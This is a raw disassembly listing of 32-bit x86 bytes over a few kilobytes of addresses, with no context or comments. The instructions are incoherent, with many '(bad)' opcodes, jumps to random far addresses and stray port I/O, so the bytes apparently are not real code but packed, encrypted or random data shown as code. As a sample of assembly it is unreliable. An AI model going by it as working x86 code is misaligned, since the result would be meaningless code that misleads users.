  40f629:	and    edi,DWORD PTR [eax-0x23]
  40f62c:	mov    esp,0xc5783c69
  40f631:	push   esp
  40f632:	jae    0x40f642
  40f634:	lahf   
  40f635:	push   edx
  40f636:	cli    
  40f637:	jecxz  0x40f648
  40f639:	mov    ch,0x58
  40f63b:	dec    ebx
  40f63c:	cwde   
  40f63d:	dec    edx
  40f63e:	mov    dl,dh
  40f640:	ins    BYTE PTR es:[edi],dx
  40f641:	pop    ebp
  40f643:	(bad)  
  40f644:	mov    bl,0x2e
  40f646:	pop    ebp
  40f647:	xchg   ecx,eax
  40f648:	push   edx
  40f649:	(bad)  
  40f64a:	pop    eax
  40f64b:	pusha  
  40f64c:	jmp    0x801b5ef3
  40f651:	and    al,0x24
  40f653:	fiadd  DWORD PTR [esi]
  40f655:	mov    bl,0x5e
  40f657:	lods   eax,DWORD PTR ds:[esi]
  40f658:	test   DWORD PTR [ebx],ecx
  40f65a:	cwde   
  40f65b:	retf   
  40f65c:	inc    eax
  40f65d:	pop    edx
  40f65e:	add    al,0x95
  40f660:	in     al,dx
  40f661:	mov    dl,0x34
  40f663:	ret    
  40f664:	stos   BYTE PTR es:[edi],al
  40f665:	in     eax,dx
  40f666:	popf   
  40f667:	jae    0x40f6a8
  40f669:	into   
  40f66a:	sbb    al,0x68
  40f66c:	test   DWORD PTR ds:0x45e77393,edi
  40f672:	add    edx,DWORD PTR ds:0xe0415997
  40f678:	cmp    ch,0xda
  40f67b:	inc    esi
  40f67c:	mov    bh,0x9b
  40f67e:	dec    esi
  40f67f:	push   esi
  40f680:	mov    eax,ds:0x638e350e
  40f685:	(bad)  
  40f686:	xor    bl,bl
  40f688:	fadd   QWORD PTR [edx+0x17b451f6]
  40f68e:	xlat   BYTE PTR ds:[ebx]
  40f68f:	push   0xffffffe5
  40f691:	outs   dx,BYTE PTR ds:[esi]
  40f692:	shl    BYTE PTR [bp+si+0x4ad6],0xf8
  40f698:	call   0x5cf659dd
  40f69d:	mov    al,ds:0x958f3526
  40f6a2:	(bad)  
  40f6a4:	pop    ebp
  40f6a5:	aad    0xc7
  40f6a7:	fld    QWORD PTR cs:[ebp+0x2c]
  40f6ab:	test   DWORD PTR [eax-0x2ba1c940],edi
  40f6b1:	pop    ebx
  40f6b2:	xor    DWORD PTR [edx+esi*8-0x203f4c8b],0xc4251bfa
  40f6bd:	aas    
  40f6be:	scas   al,BYTE PTR es:[edi]
  40f6bf:	shr    DWORD PTR [ecx-0x64],1
  40f6c2:	inc    ebp
  40f6c3:	mov    edx,0xa8cb29b0
  40f6c8:	dec    edi
  40f6c9:	dec    edi
  40f6ca:	ins    BYTE PTR es:[edi],dx
  40f6cb:	rol    BYTE PTR [ebx],1
  40f6cd:	es cld 
  40f6cf:	(bad)  
  40f6d0:	mov    ebp,0x998769e0
  40f6d5:	ret    
  40f6d6:	test   eax,0x9d7e5847
  40f6db:	dec    ecx
  40f6dc:	stos   BYTE PTR es:[edi],al
  40f6dd:	jmp    0xdfc8:0x5d50a7f9
  40f6e4:	int3   
  40f6e5:	lods   al,BYTE PTR ds:[esi]
  40f6e6:	mov    DWORD PTR [edi-0x23],ebx
  40f6e9:	icebp  
  40f6ea:	cmp    al,0xd8
  40f6ec:	retf   
  40f6ed:	push   esp
  40f6ee:	clc    
  40f6ef:	sbb    ah,BYTE PTR [edi+esi*2-0x5c]
  40f6f3:	out    dx,eax
  40f6f4:	mov    cl,0x7d
  40f6f6:	mov    ds:0xe41bd685,al
  40f6fb:	jl     0x40f6e3
  40f6fd:	xor    DWORD PTR [ecx],ecx
  40f6ff:	xchg   ebx,eax
  40f700:	dec    DWORD PTR ds:0xa4deb4b7
  40f706:	inc    edi
  40f707:	(bad)  
  40f708:	clc    
  40f709:	(bad)  
  40f70a:	cmc    
  40f70b:	(bad)  
  40f70c:	in     al,dx
  40f70d:	fs fsubrp st(6),st
  40f710:	pop    edx
  40f711:	add    BYTE PTR [esi-0xc],bh
  40f714:	and    DWORD PTR [esi-0x6a],ebx
  40f717:	retw   0x28d
  40f71b:	shl    ebp,1
  40f71d:	sub    edi,DWORD PTR ds:0x29e028f
  40f723:	std    
  40f724:	fild   QWORD PTR [ecx+0x71]
  40f727:	or     DWORD PTR [esi+0x21beb3f5],esp
  40f72d:	stos   DWORD PTR es:[edi],eax
  40f72e:	cmp    ecx,DWORD PTR [ebx+0x2c468f2e]
  40f734:	jge    0x40f717
  40f736:	add    cl,ah
  40f738:	enter  0xa6ab,0xa
  40f73c:	pop    ebx
  40f73d:	and    BYTE PTR [ecx-0x30],ch
  40f740:	mov    esp,DWORD PTR [eax]
  40f742:	mov    ds:0x4e47b0bd,al
  40f747:	lods   eax,DWORD PTR ds:[esi]
  40f748:	icebp  
  40f749:	rcl    DWORD PTR [ecx+0x3],1
  40f74c:	push   eax
  40f74d:	pusha  
  40f74e:	jmp    0x4e3745bf
  40f753:	pop    edx
  40f754:	xchg   edi,eax
  40f755:	cli    
  40f756:	fnstsw WORD PTR [edi-0x5807dcdb]
  40f75c:	rol    DWORD PTR [edx],cl
  40f75e:	sub    BYTE PTR [ebp+0x2ae4ff2d],ah
  40f764:	fcomp  QWORD PTR [eax+0x6a689dc8]
  40f76a:	or     cl,al
  40f76c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f76d:	repz push 0x3e
  40f770:	repz or BYTE PTR [ebp-0x65],cl
  40f774:	popa   
  40f775:	in     al,0x8d
  40f777:	mov    al,ds:0x3e956cb2
  40f77c:	inc    ebp
  40f77d:	jo     0x40f710
  40f77f:	stc    
  40f780:	dec    esp
  40f781:	cmc    
  40f782:	(bad)  
  40f783:	cld    
  40f784:	xor    eax,0xc8a4ef57
  40f789:	xchg   DWORD PTR [eax+0x1d],edx
  40f78c:	shr    DWORD PTR [eax+0x44c1a6b6],0x37
  40f793:	fisttp WORD PTR [eax-0x5]
  40f796:	lods   al,BYTE PTR ds:[esi]
  40f797:	lods   eax,DWORD PTR ds:[esi]
  40f798:	xor    al,bh
  40f79a:	add    al,al
  40f79c:	iret   
  40f79d:	pop    ebp
  40f79e:	add    al,0x65
  40f7a0:	mov    ebp,0x630a3a50
  40f7a5:	push   cs
  40f7a6:	aas    
  40f7a7:	leave  
  40f7a8:	or     dh,BYTE PTR [ebp-0x5b]
  40f7ab:	dec    esp
  40f7ac:	inc    ecx
  40f7ad:	cmp    ebx,edx
  40f7af:	jnp    0x40f773
  40f7b1:	push   ds
  40f7b2:	daa    
  40f7b3:	mov    ds:0xc66df999,al
  40f7b8:	add    DWORD PTR [ebp-0x6c],ebp
  40f7bb:	sub    esp,DWORD PTR [ecx+0x11]
  40f7be:	test   BYTE PTR [ecx],dl
  40f7c0:	pusha  
  40f7c1:	sbb    dh,ch
  40f7c3:	dec    esi
  40f7c4:	sbb    al,0x71
  40f7c6:	push   es
  40f7c7:	jle    0x40f7d0
  40f7c9:	out    0xf0,eax
  40f7cb:	push   cs
  40f7cc:	sub    BYTE PTR [ebx-0x68],bh
  40f7cf:	rcr    BYTE PTR [esi-0x3fbc1681],cl
  40f7d5:	mov    edi,0xf21e2243
  40f7da:	mov    al,0x2a
  40f7dc:	dec    edx
  40f7dd:	dec    edi
  40f7de:	scas   al,BYTE PTR es:[edi]
  40f7df:	sbb    DWORD PTR [edx+0x19],0x89b6aefc
  40f7e6:	stos   DWORD PTR es:[edi],eax
  40f7e7:	xchg   edi,eax
  40f7e8:	cmp    bh,ah
  40f7ea:	aam    0xc2
  40f7ec:	sub    esp,edx
  40f7ee:	aad    0x5d
  40f7f0:	xchg   esp,eax
  40f7f1:	push   ebx
  40f7f2:	call   0x3fae:0x4f628b66
  40f7f9:	push   ebp
  40f7fa:	cld    
  40f7fb:	mov    dh,0xaf
  40f7fd:	stc    
  40f7fe:	adc    BYTE PTR [edx-0x59],dh
  40f801:	cmp    DWORD PTR [ebx],ebp
  40f803:	sub    al,0x89
  40f805:	out    0x6d,eax
  40f807:	dec    ebx
  40f808:	das    
  40f809:	push   es
  40f80a:	test   al,0x22
  40f80c:	div    DWORD PTR [eax-0x43364a55]
  40f812:	cdq    
  40f813:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f814:	sbb    ch,BYTE PTR [eax-0x7b]
  40f817:	jns    0x40f7d1
  40f819:	dec    ebx
  40f81a:	stos   BYTE PTR es:[edi],al
  40f81b:	mov    eax,ds:0x917573d3
  40f820:	adc    ah,BYTE PTR [ecx-0x2e22e651]
  40f826:	mov    dl,0x10
  40f828:	pop    ds
  40f829:	jl     0x40f7f6
  40f82b:	mov    cl,0xe5
  40f82d:	add    cl,BYTE PTR [ebx]
  40f82f:	les    esi,FWORD PTR [ebp-0x58]
  40f832:	or     BYTE PTR [eax+0x2361e87b],ah
  40f838:	dec    ecx
  40f839:	jb     0x40f800
  40f83b:	mov    bh,0x70
  40f83d:	imul   ebx
  40f83f:	and    edi,ebp
  40f841:	ja     0x40f85b
  40f843:	jmp    0x4ef9:0x3c65fbb2
  40f84a:	(bad)  
  40f84b:	lock fst DWORD PTR [edi]
  40f84e:	gs ins DWORD PTR es:[edi],dx
  40f850:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f851:	xchg   ecx,eax
  40f852:	mov    ds:0xec7a5c83,eax
  40f857:	xchg   esp,eax
  40f858:	mov    edi,eax
  40f85a:	dec    ebx
  40f85b:	call   FWORD PTR [eax]
  40f85d:	outs   dx,BYTE PTR ds:[esi]
  40f85e:	imul   esi,DWORD PTR [ecx+0x44],0xfffffffc
  40f862:	stos   DWORD PTR es:[edi],eax
  40f863:	(bad)  
  40f864:	out    dx,eax
  40f865:	jg     0x40f8ab
  40f867:	mov    bh,0x2f
  40f869:	lods   al,BYTE PTR ds:[esi]
  40f86a:	and    dh,ah
  40f86c:	dec    esp
  40f86d:	jl     0x40f81c
  40f86f:	ret    
  40f870:	aaa    
  40f871:	push   es
  40f872:	inc    eax
  40f873:	cmc    
  40f874:	ins    DWORD PTR es:[edi],dx
  40f875:	pop    ebp
  40f876:	cmp    esi,edi
  40f878:	and    DWORD PTR [ebx],esp
  40f87a:	fwait
  40f87b:	pop    ebp
  40f87c:	repz out dx,al
  40f87e:	test   eax,0xc71277e8
  40f883:	adc    bl,BYTE PTR [ecx-0x3f]
  40f886:	aam    0x8b
  40f888:	out    0xf1,al
  40f88a:	or     edi,DWORD PTR [edi+0x27]
  40f88d:	jb     0x40f8a7
  40f88f:	mov    bh,0x22
  40f891:	inc    edi
  40f892:	jl     0x40f913
  40f894:	mov    ebp,0xde69f78b
  40f899:	(bad)  
  40f89a:	mov    cl,0xda
  40f89c:	inc    ebx
  40f89d:	mov    al,ds:0x76b1992d
  40f8a2:	adc    DWORD PTR [esi*8+0x77fac0fb],0xe09e5a0d
  40f8ad:	mov    esi,0xc015cb5e
  40f8b2:	mov    ecx,0x7b019e47
  40f8b7:	nop
  40f8b8:	xchg   edx,eax
  40f8b9:	pxor   mm2,QWORD PTR [edx]
  40f8bc:	push   edi
  40f8bd:	stos   DWORD PTR es:[edi],eax
  40f8be:	jmp    0xf92e:0xd57419e5
  40f8c5:	es or  eax,0x36701d45
  40f8cb:	pusha  
  40f8cc:	lahf   
  40f8cd:	mov    esp,0x423b8ee6
  40f8d2:	pop    edi
  40f8d3:	mov    ebx,0x971f1dd9
  40f8d8:	sbb    al,cl
  40f8da:	mov    eax,0x7914e1c4
  40f8df:	jns    0x40f866
  40f8e1:	stos   BYTE PTR es:[edi],al
  40f8e2:	push   cs
  40f8e3:	aam    0x7a
  40f8e5:	lods   eax,DWORD PTR ds:[esi]
  40f8e6:	call   0xc40d:0xcda49d43
  40f8ed:	and    al,0xbb
  40f8ef:	or     al,0x8
  40f8f1:	jecxz  0x40f8a2
  40f8f3:	fwait
  40f8f4:	out    0xf7,al
  40f8f6:	jo     0x40f8dd
  40f8f8:	mov    dh,0xbd
  40f8fa:	test   al,0x8a
  40f8fc:	fcmovnu st,st(3)
  40f8fe:	hlt    
  40f8ff:	xchg   edx,eax
  40f900:	(bad)  
  40f901:	call   FWORD PTR [esi+0x6a046d6f]
  40f907:	(bad)  
  40f908:	cmp    eax,DWORD PTR [esi+0x17]
  40f90b:	pop    ebp
  40f90c:	add    BYTE PTR ds:0x4f3d0beb,bh
  40f912:	mov    ds:0xe24d567a,al
  40f917:	rcl    DWORD PTR [ebx-0x66a508dd],cl
  40f91d:	pop    ds
  40f91e:	cmp    BYTE PTR [ecx],dh
  40f920:	inc    ecx
  40f921:	daa    
  40f922:	and    eax,0xa48c2f04
  40f927:	ficom  WORD PTR [eax+0x5e]
  40f92a:	iret   
  40f92b:	scas   al,BYTE PTR es:[edi]
  40f92c:	mov    WORD PTR [ebp-0x53],gs
  40f92f:	in     eax,0x3c
  40f931:	retf   0x396b
  40f934:	aad    0xa0
  40f936:	out    dx,eax
  40f937:	sub    DWORD PTR [esi+0x6a5c45fa],edx
  40f93d:	adc    al,0x90
  40f93f:	sti    
  40f940:	call   0xedcb:0x336de7ab
  40f947:	lahf   
  40f948:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f949:	cmp    BYTE PTR [ebx+eax*2-0x5d],dh
  40f94d:	test   ebp,esp
  40f94f:	fwait
  40f950:	push   ss
  40f951:	cmp    eax,0x8e1ecad2
  40f956:	sbb    eax,0xc2f3c422
  40f95b:	loope  0x40f986
  40f95d:	test   al,0x9
  40f95f:	mov    DWORD PTR [edx],esi
  40f961:	dec    edi
  40f962:	adc    BYTE PTR [ecx+0x986fc44],0xb6
  40f969:	out    0xe2,al
  40f96b:	adc    esi,DWORD PTR [edx+0x1bcd8fab]
  40f971:	scas   al,BYTE PTR es:[edi]
  40f972:	dec    ecx
  40f973:	imul   ebp,DWORD PTR [edx-0x4e],0x1e503b6e
  40f97a:	mov    ecx,0x7c996320
  40f97f:	inc    ebp
  40f980:	xor    al,0x96
  40f982:	xor    eax,0x593eb280
  40f987:	jb     0x40f98d
  40f989:	(bad)  
  40f98a:	outs   dx,BYTE PTR ds:[esi]
  40f98b:	addr16 sti 
  40f98d:	pop    ebp
  40f98e:	outs   dx,DWORD PTR fs:[esi]
  40f990:	adc    ch,dh
  40f992:	rcr    DWORD PTR [edx+0x50],1
  40f995:	inc    ebx
  40f996:	mov    edx,0x340faae3
  40f99b:	or     al,BYTE PTR [esi]
  40f99d:	pop    ds
  40f99e:	lea    esi,[ecx+0x3d4261d0]
  40f9a4:	stos   BYTE PTR es:[edi],al
  40f9a5:	mov    esi,0xf05413e6
  40f9aa:	fdivp  st(2),st
  40f9ac:	inc    edi
  40f9ad:	pop    es
  40f9ae:	sbb    DWORD PTR [ebx+eax*8-0x65],ecx
  40f9b2:	ret    
  40f9b3:	jo     0x40fa08
  40f9b5:	bound  edx,QWORD PTR [esi-0x7273cc8c]
  40f9bb:	stos   BYTE PTR es:[edi],al
  40f9bc:	aad    0x8d
  40f9be:	mov    al,ds:0x40d41295
  40f9c3:	sbb    al,0x4
  40f9c5:	mov    dl,0x25
  40f9c7:	sbb    al,0x5a
  40f9c9:	mov    edi,0x6db2b857
  40f9ce:	and    eax,DWORD PTR [eax+0x62]
  40f9d1:	add    dh,ah
  40f9d3:	push   esp
  40f9d4:	adc    dl,dl
  40f9d6:	scas   al,BYTE PTR es:[edi]
  40f9d7:	ds call 0x160e:0xae2661e9
  40f9df:	add    DWORD PTR [ebx+0x3b],edi
  40f9e2:	or     eax,0xebe73a2b
  40f9e7:	jns    0x40f9f7
  40f9e9:	add    al,0x3c
  40f9eb:	aas    
  40f9ec:	jbe    0x40f9c8
  40f9ee:	(bad)  
  40f9ef:	push   ds
  40f9f0:	push   ebx
  40f9f1:	dec    eax
  40f9f2:	bound  ecx,QWORD PTR [esp+esi*4-0x77059290]
  40f9f9:	ret    0x9dea
  40f9fc:	into   
  40f9fd:	mov    edi,0xb2be2550
  40fa02:	out    0x2a,eax
  40fa04:	(bad)  
  40fa06:	jbe    0x40fa50
  40fa08:	mov    dl,0x51
  40fa0a:	mov    eax,ds:0xc79b0ab5
  40fa0f:	dec    edx
  40fa10:	(bad)  
  40fa11:	pop    ss
  40fa12:	adc    bh,BYTE PTR es:0xed1ee33a
  40fa19:	pop    esi
  40fa1a:	push   ds
  40fa1b:	or     eax,0x96271d27
  40fa20:	pop    esi
  40fa21:	adc    al,0x31
  40fa23:	int    0xb8
  40fa25:	push   esi
  40fa26:	mov    esp,0x894d04f6
  40fa2b:	inc    edi
  40fa2c:	cli    
  40fa2d:	adc    al,0xef
  40fa2f:	hlt    
  40fa30:	push   edx
  40fa31:	aad    0xe2
  40fa33:	gs icebp 
  40fa35:	mov    ah,0x97
  40fa37:	pop    edx
  40fa38:	inc    esi
  40fa39:	xchg   cx,ax
  40fa3b:	cmp    BYTE PTR [ebx],al
  40fa3d:	xor    eax,0xe327d445
  40fa42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa43:	or     BYTE PTR [edi],dh
  40fa45:	dec    esp
  40fa46:	mov    esi,0xb7792cad
  40fa4b:	mov    al,BYTE PTR [ecx]
  40fa4d:	push   edi
  40fa4e:	add    al,0x84
  40fa50:	jno    0x40fa57
  40fa52:	dec    ebp
  40fa53:	or     BYTE PTR [ebx+0x36982dc1],al
  40fa59:	xor    DWORD PTR [edi],esi
  40fa5b:	add    DWORD PTR [ecx*8+0x41730fe4],ebx
  40fa62:	mov    ds:0x50cebf41,al
  40fa67:	mov    dh,0x51
  40fa69:	pop    ds
  40fa6a:	imul   edx,DWORD PTR [ecx-0x2b],0xffffffb2
  40fa6e:	xlat   BYTE PTR ds:[ebx]
  40fa6f:	pop    ss
  40fa70:	nop
  40fa71:	rcl    DWORD PTR [eax-0x37d9864c],0x66
  40fa78:	cld    
  40fa79:	jmp    0xc8ce12e4
  40fa7e:	xor    BYTE PTR [edi],ch
  40fa80:	pop    ebp
  40fa81:	std    
  40fa82:	xchg   edi,eax
  40fa83:	cli    
  40fa84:	jg     0x40fa6d
  40fa86:	jno    0x40fab1
  40fa88:	add    BYTE PTR [eax-0x74d6dbfb],ah
  40fa8e:	xchg   ebp,eax
  40fa8f:	sti    
  40fa90:	retf   0x4d48
  40fa93:	and    al,0x29
  40fa95:	aam    0x93
  40fa97:	jns    0x40faff
  40fa99:	pop    ss
  40fa9a:	sbb    DWORD PTR [esp+eax*1+0x5885cae3],edx
  40faa1:	dec    esi
  40faa2:	sbb    BYTE PTR [ecx-0x7d],0x6b
  40faa6:	dec    edx
  40faa7:	push   DWORD PTR [ebp+0x42732760]
  40faad:	ror    BYTE PTR [ebp+0x1d],0x72
  40fab1:	repnz (bad) 
  40fab3:	lahf   
  40fab4:	fmul   QWORD PTR [edx+eiz*8]
  40fab7:	mov    esp,0x39cd29b
  40fabc:	mov    ecx,0x1e2e486b
  40fac1:	add    eax,0x37d8ff2b
  40fac6:	lea    edx,[esi+0x39]
  40fac9:	lods   eax,DWORD PTR ds:[esi]
  40faca:	test   BYTE PTR [esi],ah
  40facc:	rol    DWORD PTR ds:[eax+0x34],1
  40fad0:	jge    0x40fb0d
  40fad2:	imul   ebp,DWORD PTR [ebx-0x75],0x5e8cac2
  40fad9:	sub    eax,ebp
  40fadb:	call   0xd5da0077
  40fae0:	push   edi
  40fae1:	pop    ebx
  40fae2:	cmc    
  40fae3:	dec    eax
  40fae4:	adc    DWORD PTR [edx],0xc2b3b503
  40faea:	pop    ecx
  40faeb:	dec    esp
  40faec:	cli    
  40faed:	repnz add DWORD PTR [ebp+0x25c6df2f],edx
  40faf4:	sbb    eax,DWORD PTR [eax+ebx*8-0x7]
  40faf8:	inc    esp
  40faf9:	pop    edx
  40fafa:	cmp    BYTE PTR [eax],0x94
  40fafd:	sbb    al,0xc7
  40faff:	(bad)  
  40fb00:	xchg   edx,eax
  40fb01:	jns    0x40fb0e
  40fb03:	push   edx
  40fb04:	xor    DWORD PTR [eax-0x524a9613],ebx
  40fb0a:	adc    al,0x52
  40fb0c:	fs in  eax,0x7e
  40fb0f:	mov    edx,0x16608411
  40fb14:	lods   al,BYTE PTR ds:[esi]
  40fb15:	mov    eax,ds:0xbfeb0814
  40fb1a:	popa   
  40fb1b:	jb     0x40fb9b
  40fb1d:	sbb    BYTE PTR ds:0x269d460b,0xb7
  40fb24:	xchg   edi,eax
  40fb25:	addr16 cmp ebx,ebp
  40fb28:	push   es
  40fb29:	mov    edi,0x7308c2c9
  40fb2e:	cdq    
  40fb2f:	daa    
  40fb30:	test   eax,0x39ef6596
  40fb35:	in     al,dx
  40fb36:	sub    al,0xc3
  40fb38:	and    eax,0xb61078f0
  40fb3d:	test   DWORD PTR [esi+0x78],ebx
  40fb40:	or     BYTE PTR [ebx-0x7b],0xa9
  40fb44:	jne    0x40fb81
  40fb46:	in     al,dx
  40fb47:	inc    edi
  40fb48:	mov    al,ds:0xb99f4abb
  40fb4d:	sub    al,0xc9
  40fb4f:	loope  0x40fb1c
  40fb51:	ret    0x3d1d
  40fb54:	jae    0x40fbab
  40fb56:	mov    ecx,0x5d09586d
  40fb5b:	jo     0x40fb9e
  40fb5d:	xchg   ecx,eax
  40fb5e:	xlat   BYTE PTR ds:[ebx]
  40fb5f:	push   ebp
  40fb60:	jno    0x40fb4d
  40fb62:	xchg   ebp,eax
  40fb63:	cmp    bh,ch
  40fb65:	mov    ebp,0x55cbf155
  40fb6a:	bound  edx,QWORD PTR ds:0xe90f0e76
  40fb70:	addr16 jns 0x40fba7
  40fb73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb74:	mov    al,0x8f
  40fb76:	ja     0x40fb51
  40fb78:	test   al,0x21
  40fb7a:	push   0x8a49e984
  40fb7f:	lods   al,BYTE PTR ss:[esi]
  40fb81:	aam    0xf8
  40fb83:	jp     0x40fc02
  40fb85:	mov    ebx,0x72033eda
  40fb8a:	out    dx,al
  40fb8b:	jle    0x40fbed
  40fb8d:	lock shl DWORD PTR [ecx+edx*2-0xe9833fb],1
  40fb95:	jg     0x40fb27
  40fb97:	test   eax,0x5967362d
  40fb9c:	mov    al,ds:0xbc3fbfe4
  40fba1:	cwde   
  40fba2:	or     ebx,DWORD PTR [edx]
  40fba4:	add    al,0xc1
  40fba6:	mov    ds:0xa09c16b1,eax
  40fbab:	rcl    BYTE PTR [eax],cl
  40fbad:	jae    0x40fbf2
  40fbaf:	mov    ebx,0x6b8b616c
  40fbb4:	xchg   ecx,eax
  40fbb5:	and    al,0x63
  40fbb7:	arpl   WORD PTR [edx+0x53],cx
  40fbba:	das    
  40fbbb:	xor    eax,0x18d588aa
  40fbc0:	add    ch,BYTE PTR [ecx-0x608df9c5]
  40fbc6:	mov    ds:0x86a581c4,eax
  40fbcb:	jae    0x40fb8b
  40fbcd:	xchg   ah,ah
  40fbcf:	push   edi
  40fbd0:	loopne 0x40fb75
  40fbd2:	cli    
  40fbd3:	dec    ebp
  40fbd4:	push   0xffffffc9
  40fbd6:	clc    
  40fbd7:	popf   
  40fbd8:	js     0x40fc01
  40fbda:	adc    BYTE PTR [esi+0x3b],0x76
  40fbde:	ret    0x5c57
  40fbe1:	out    dx,eax
  40fbe2:	aam    0xb6
  40fbe4:	stc    
  40fbe5:	rcl    esi,0xf
  40fbe8:	icebp  
  40fbe9:	out    dx,al
  40fbea:	imul   eax,esp,0x40
  40fbed:	xchg   edi,eax
  40fbee:	sbb    DWORD PTR [esi-0x343966f2],esi
  40fbf4:	arpl   WORD PTR [ebp+0x73ab7912],bx
  40fbfa:	push   edi
  40fbfb:	mov    eax,ds:0xf8491c8d
  40fc00:	add    al,0x71
  40fc02:	and    eax,0x4106892c
  40fc07:	inc    esp
  40fc08:	mov    ds:0xd7bf0a3,eax
  40fc0d:	or     eax,0xc0e0db51
  40fc12:	jecxz  0x40fc7b
  40fc14:	aas    
  40fc15:	adc    BYTE PTR [ecx+0x57276564],bl
  40fc1b:	and    al,0x41
  40fc1d:	loope  0x40fc85
  40fc1f:	mov    BYTE PTR [ecx-0x34],bl
  40fc22:	and    BYTE PTR [ecx],al
  40fc24:	test   DWORD PTR [edi-0x4c962f51],esp
  40fc2a:	mov    ebx,0xebc161ad
  40fc2f:	lods   eax,DWORD PTR ds:[esi]
  40fc30:	es add al,0x98
  40fc33:	(bad)  
  40fc34:	mov    al,ds:0x837797c6
  40fc39:	push   0xffffffc7
  40fc3b:	ss dec edi
  40fc3d:	pop    ss
  40fc3e:	out    0x7a,al
  40fc40:	pop    esi
  40fc41:	(bad)  
  40fc42:	cmp    al,0x65
  40fc44:	inc    ebx
  40fc45:	pop    ss
  40fc46:	aas    
  40fc47:	add    al,0x64
  40fc49:	in     al,dx
  40fc4a:	rcl    DWORD PTR [edx],cl
  40fc4c:	or     DWORD PTR [ebp+0x44706ab3],edx
  40fc52:	mov    ah,0x48
  40fc54:	dec    ebp
  40fc55:	pop    esp
  40fc56:	fcmovne st,st(3)
  40fc58:	push   es
  40fc59:	fcmovne st,st(6)
  40fc5b:	test   al,0x21
  40fc5d:	jl     0x40fc54
  40fc5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc60:	mov    ebp,0x22546b2c
  40fc65:	int    0xa1
  40fc67:	dec    ebp
  40fc68:	xchg   DWORD PTR [ebp+0x191c5b6c],ebx
  40fc6e:	leave  
  40fc6f:	mov    dl,BYTE PTR [edi+0x47abb5a9]
  40fc75:	mov    esp,cs
  40fc77:	mov    ss,edx
  40fc79:	adc    DWORD PTR [edx-0x6d],esp
  40fc7c:	loope  0x40fc9a
  40fc7e:	ins    BYTE PTR es:[edi],dx
  40fc7f:	js     0x40fcf1
  40fc81:	xchg   edx,eax
  40fc82:	sbb    edi,DWORD PTR [ecx+0x4]
  40fc85:	sub    bl,bh
  40fc87:	dec    edi
  40fc88:	mov    cs,WORD PTR ds:0xc4a206d
  40fc8e:	jnp    0x40fca0
  40fc90:	xor    BYTE PTR es:[ebx+0x7e6efef],dl
  40fc97:	out    0xfe,al
  40fc99:	dec    edx
  40fc9a:	mov    ebx,ss
  40fc9c:	or     DWORD PTR [ebp+0x4ad8cc20],0x46
  40fca3:	test   al,0x8a
  40fca5:	add    al,0x8a
  40fca7:	xor    BYTE PTR [edi+0x15],cl
  40fcaa:	test   al,0x2e
  40fcac:	xor    ch,BYTE PTR [ebp-0x5297314]
  40fcb2:	cli    
  40fcb3:	mov    bh,0xee
  40fcb5:	(bad)  
  40fcb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcb8:	sbb    eax,0x32a85ecd
  40fcbd:	cmp    ch,BYTE PTR [esi+0x203f2593]
  40fcc3:	xchg   edi,eax
  40fcc4:	mov    al,ds:0xab31ee9d
  40fcc9:	rcl    DWORD PTR [edi-0x4593e1d7],1
  40fccf:	lock ret 
  40fcd1:	jb     0x40fd42
  40fcd3:	xchg   ebp,ebx
  40fcd5:	ins    DWORD PTR es:[edi],dx
  40fcd6:	mov    edx,0x8fd07621
  40fcdb:	ja     0x40fd46
  40fcdd:	or     ch,ah
  40fcdf:	mov    bl,0xcb
  40fce1:	jl     0x40fcfe
  40fce3:	mov    esi,0x625f4757
  40fce8:	fistp  WORD PTR [ebp-0x89b8d80]
  40fcee:	stos   DWORD PTR es:[edi],eax
  40fcef:	mov    edx,0x7fbecad0
  40fcf4:	test   bl,bh
  40fcf6:	mov    esp,0x961cf1d6
  40fcfb:	cdq    
  40fcfc:	pop    edx
  40fcfd:	shl    ebx,0xc0
  40fd00:	xchg   edi,ebx
  40fd02:	fstp   TBYTE PTR [ebx+ecx*1+0x7489748c]
  40fd09:	sub    DWORD PTR ds:0x80004112,ebp
  40fd0f:	js     0x40fd34
  40fd11:	std    
  40fd12:	xchg   edi,eax
  40fd13:	cmp    edi,edx
  40fd15:	xchg   edi,eax
  40fd16:	retf   0x739d
  40fd19:	or     DWORD PTR [edx+0x1c],edi
  40fd1c:	xchg   ebx,eax
  40fd1d:	fdivr  DWORD PTR [esp+ebx*4-0x56]
  40fd21:	shl    DWORD PTR [ebp+0x4f],0x45
  40fd25:	mov    edx,0x4d4699f7
  40fd2a:	stc    
  40fd2b:	mov    ds:0xaeac9918,eax
  40fd30:	jno    0x40fd4a
  40fd32:	cdq    
  40fd33:	ret    0xbd7f
  40fd36:	fs jmp 0xbf8f:0x35f97ddb
  40fd3e:	xor    al,0x4b
  40fd40:	js     0x40fd6f
  40fd42:	(bad)  
  40fd43:	rol    BYTE PTR [ebp-0xb],1
  40fd46:	jae    0x40fd85
  40fd48:	out    dx,eax
  40fd49:	cmc    
  40fd4a:	sbb    bl,BYTE PTR [eax-0x7f4d2e47]
  40fd50:	das    
  40fd51:	push   cs
  40fd52:	in     al,0x18
  40fd54:	xor    bh,bh
  40fd56:	xchg   bl,cl
  40fd58:	jne    0x40fcfc
  40fd5a:	pop    edi
  40fd5b:	xor    ch,BYTE PTR es:[ecx+edx*8+0x2a]
  40fd60:	ret    0x5c15
  40fd63:	and    BYTE PTR [ecx-0x52df8a3a],cl
  40fd69:	adc    ecx,DWORD PTR [esi-0x2c]
  40fd6c:	pop    ss
  40fd6d:	jge    0x40fd63
  40fd6f:	pop    edx
  40fd70:	dec    eax
  40fd71:	pushf  
  40fd72:	dec    ebx
  40fd73:	jnp    0x40fd10
  40fd75:	or     eax,0xd418dd3b
  40fd7a:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40fd7c:	xor    eax,eax
  40fd7e:	jbe    0x40fddb
  40fd80:	mov    ebx,DWORD PTR ds:0x2a574fb7
  40fd86:	in     eax,dx
  40fd87:	xor    bl,0x13
  40fd8a:	cmp    al,0x1c
  40fd8c:	iret   
  40fd8d:	dec    ch
  40fd8f:	xor    BYTE PTR [ecx-0x74f116b1],bl
  40fd95:	cdq    
